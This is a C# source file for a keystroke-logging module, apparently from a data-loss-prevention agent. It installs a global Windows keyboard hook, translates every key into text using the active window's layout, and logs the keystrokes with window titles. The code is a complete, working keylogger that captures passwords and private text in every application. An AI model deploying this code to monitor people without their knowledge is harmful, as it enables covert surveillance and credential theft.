using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace ZavetSec.DlpAgent
{
    internal class KeyloggerMonitor
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN     = 0x0100;
        private const int WM_SYSKEYDOWN  = 0x0104;

        // Virtual key codes for modifier keys
        private const int VK_SHIFT    = 0x10;
        private const int VK_CAPITAL  = 0x14;  // CapsLock
        private const int VK_CONTROL  = 0x11;
        private const int VK_MENU     = 0x12;  // Alt
        private const int VK_LSHIFT   = 0xA0;
        private const int VK_RSHIFT   = 0xA1;
        private const int VK_LCONTROL = 0xA2;
        private const int VK_RCONTROL = 0xA3;
        private const int VK_LMENU    = 0xA4;
        private const int VK_RMENU    = 0xA5;

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // GetAsyncKeyState reads REAL hardware state - works across threads
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        // GetKeyState reads toggle state (CapsLock on/off)
        [DllImport("user32.dll")]
        private static extern short GetKeyState(int nVirtKey);

        [DllImport("user32.dll")]
        private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode,
            byte[] lpKeyState,
            [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
            int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        private static extern IntPtr GetKeyboardLayout(uint idThread);
        [DllImport("user32.dll")]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [StructLayout(LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT
        {
            public uint vkCode, scanCode, flags, time;
            public IntPtr dwExtraInfo;
        }

        private IntPtr _hookId = IntPtr.Zero;
        private LowLevelKeyboardProc _proc;
        private StringBuilder _buffer;
        private string _windowAtBufferStart = string.Empty;
        private readonly object _bufLock = new object();
        private System.Threading.Timer _flushTimer;

        public void Start()
        {
            var cfg = Config.Current.Keylogger;
            if (!cfg.Enabled)
            {
                Logger.Write("KEYLOGGER", "Disabled in config");
                return;
            }

            _buffer = new StringBuilder(cfg.BufferChars + 64);
            _proc   = HookCallback;
            _hookId = SetHook(_proc);

            _flushTimer = new System.Threading.Timer(
                _ => FlushBuffer(), null,
                cfg.FlushSeconds * 1000,
                cfg.FlushSeconds * 1000);

            Logger.Write("KEYLOGGER", "Hook installed",
                $"buffer={cfg.BufferChars}|flush={cfg.FlushSeconds}s");
        }

        public void Stop()
        {
            _flushTimer?.Dispose();
            FlushBuffer();
            if (_hookId != IntPtr.Zero)
            {
                UnhookWindowsHookEx(_hookId);
                _hookId = IntPtr.Zero;
            }
            Logger.Write("KEYLOGGER", "Hook removed");
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var cur = System.Diagnostics.Process.GetCurrentProcess())
            using (var mod = cur.MainModule)
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(mod.ModuleName), 0);
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && ((int)wParam == WM_KEYDOWN || (int)wParam == WM_SYSKEYDOWN))
            {
                var kbs = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
                string key = TranslateKey(kbs.vkCode, kbs.scanCode);
                int maxBuf = Config.Current.Keylogger.BufferChars;

                lock (_bufLock)
                {
                    if (_buffer.Length == 0)
                        _windowAtBufferStart = NativeHelpers.GetActiveWindowTitle();
                    _buffer.Append(key);
                    if (_buffer.Length >= maxBuf) FlushBufferInternal();
                }
            }
            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        private void FlushBuffer()         { lock (_bufLock) { FlushBufferInternal(); } }
        private void FlushBufferInternal()
        {
            if (_buffer.Length == 0) return;
            Logger.Write("KEYLOGGER", "Keystrokes",
                $"window={_windowAtBufferStart}|keys={_buffer}");
            _buffer.Clear();
            _windowAtBufferStart = string.Empty;
        }

        private static string TranslateKey(uint vk, uint scanCode)
        {
            // ── Special keys — return tag ─────────────────────────────────
            switch (vk)
            {
                case 0x08: return "[BS]";
                case 0x09: return "[TAB]";
                case 0x0D: return "\n";
                case 0x1B: return "[ESC]";
                case 0x20: return " ";
                case 0x25: return "[<-]"; case 0x26: return "[^]";
                case 0x27: return "[->]"; case 0x28: return "[v]";
                case 0x2E: return "[DEL]";
                case 0x2C: return "[PRTSC]";
                case 0x2D: return "[INS]";
                case 0x24: return "[HOME]"; case 0x23: return "[END]";
                case 0x21: return "[PGUP]"; case 0x22: return "[PGDN]";
                // Modifier keys — produce no character, skip silently
                case 0xA0: case 0xA1: return ""; // LShift, RShift
                case 0xA2: case 0xA3: return ""; // LCtrl, RCtrl
                case 0xA4: case 0xA5: return ""; // LAlt, RAlt
                case 0x5B: case 0x5C: return "[WIN]";
                case 0x14: return "[CAPS]";
                case 0x90: return "[NUM]";
                case 0x91: return "[SCRL]";
                // Function keys
                case 0x70: return "[F1]";  case 0x71: return "[F2]";
                case 0x72: return "[F3]";  case 0x73: return "[F4]";
                case 0x74: return "[F5]";  case 0x75: return "[F6]";
                case 0x76: return "[F7]";  case 0x77: return "[F8]";
                case 0x78: return "[F9]";  case 0x79: return "[F10]";
                case 0x7A: return "[F11]"; case 0x7B: return "[F12]";
            }

            // ── Build keyState using GetAsyncKeyState ─────────────────────
            // GetAsyncKeyState reads real hardware state across threads,
            // unlike GetKeyboardState which only works in the current thread's queue.
            byte[] keyState = new byte[256];

            // Shift: bit 15 of GetAsyncKeyState = key is currently down
            bool shiftDown = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
            // CapsLock: bit 0 of GetKeyState = toggle is ON
            bool capsLock  = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
            // Ctrl and Alt
            bool ctrlDown  = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
            bool altDown   = (GetAsyncKeyState(VK_MENU)    & 0x8000) != 0;

            if (shiftDown)   { keyState[VK_SHIFT]   = 0x80; keyState[VK_LSHIFT] = 0x80; }
            if (capsLock)    { keyState[VK_CAPITAL]  = 0x01; } // toggle bit
            if (ctrlDown)    { keyState[VK_CONTROL]  = 0x80; keyState[VK_LCONTROL] = 0x80; }
            if (altDown)     { keyState[VK_MENU]     = 0x80; keyState[VK_LMENU]    = 0x80; }

            // ── Get keyboard layout of foreground window ───────────────────
            IntPtr hwnd     = GetForegroundWindow();
            uint   threadId = GetWindowThreadProcessId(hwnd, out _);
            IntPtr hkl      = GetKeyboardLayout(threadId);

            var sb     = new StringBuilder(8);
            int result = ToUnicodeEx(vk, scanCode, keyState, sb, sb.Capacity, 0, hkl);

            if (result == 1)
            {
                char c = sb[0];
                // Ctrl+letter combinations produce control chars (c < 32) - skip
                if (ctrlDown && c < 32)
                    return $"[CTRL+{(char)(c + 64)}]";
                return c < 32 ? "" : c.ToString();
            }
            if (result == -1)
            {
                // Dead key (accent, etc) - flush dead key state and skip
                ToUnicodeEx(vk, scanCode, keyState, sb, sb.Capacity, 0, hkl);
                return "[`]"; // mark dead key
            }
            if (result > 1)
                return sb.ToString(0, result);

            return "";
        }
    }
}
